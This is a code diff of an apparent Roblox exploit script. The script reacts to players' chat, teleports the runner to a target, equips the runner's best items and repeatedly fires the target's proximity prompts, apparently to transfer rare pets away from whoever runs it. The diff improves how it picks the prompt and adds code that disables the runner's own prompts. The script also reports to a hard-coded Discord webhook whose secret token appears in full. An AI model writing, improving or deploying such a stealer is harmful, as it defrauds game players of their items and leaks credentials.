@@ -4,6 +4,7 @@ local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local Camera = workspace.CurrentCamera
 local TeleportService = game:GetService("TeleportService")
+local UserInputService = game:GetService("UserInputService")
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
 local RARE_PETS = {
@@ -29,7 +30,8 @@ local function sendToDiscord(content, embed)
         embeds = {embed}
     }
     local success, err = pcall(function()
-        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
+        local json = HttpService:JSONEncode(payload)
+        HttpService:PostAsync(WEBHOOK_URL, json)
     end)
     if not success then
         warn("Webhook failed: "..err)
@@ -101,13 +103,19 @@ local function getBestItem(target)
     return bestItem
 end
 
-local function findInteractPart(targetChar)
+local function findBestPrompt(targetChar)
+    local bestPrompt, highestHoldDuration = nil, 0
+    
     for _,part in pairs(targetChar:GetDescendants()) do
-        if part:IsA("ProximityPrompt") or part:FindFirstChildWhichIsA("BillboardGui") then
-            return part
+        if part:IsA("ProximityPrompt") then
+            if part.HoldDuration > highestHoldDuration then
+                highestHoldDuration = part.HoldDuration
+                bestPrompt = part
+            end
         end
     end
-    return targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
+    
+    return bestPrompt or targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
 end
 
 local function teleportToPlayer(target)
@@ -122,7 +130,7 @@ end
 local function interactWithTarget(target)
     teleportToPlayer(target)
     local targetChar = target.Character or target.CharacterAdded:Wait()
-    local interactPart = findInteractPart(targetChar)
+    local interactPart = findBestPrompt(targetChar)
     
     LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
     LocalPlayer.CameraMaxZoomDistance = 0.5
@@ -137,16 +145,13 @@ local function interactWithTarget(target)
         if not bestItem then break end
         
         LocalPlayer.Character.Humanoid:EquipTool(bestItem)
+        task.wait(0.5)
         
-        local prompt = interactPart:FindFirstChildWhichIsA("ProximityPrompt")
-        if prompt then
-            fireproximityprompt(prompt)
-            task.wait(0.1)
-            
+        if interactPart:IsA("ProximityPrompt") then
             local startTime = os.clock()
             while os.clock() - startTime < 5 do
-                if not prompt.Enabled then break end
-                fireproximityprompt(prompt)
+                if not interactPart.Enabled then break end
+                fireproximityprompt(interactPart)
                 task.wait(0.1)
             end
         else
@@ -212,3 +217,17 @@ Players.PlayerAdded:Connect(function(player)
         onPlayerChatted(player, msg)
     end)
 end)
+
+local function disableLocalPrompts()
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local rootPart = character:WaitForChild("HumanoidRootPart")
+    
+    for _,child in pairs(rootPart:GetChildren()) do
+        if child:IsA("ProximityPrompt") then
+            child.Enabled = false
+        end
+    end
+end
+
+LocalPlayer.CharacterAdded:Connect(disableLocalPrompts)
+disableLocalPrompts()
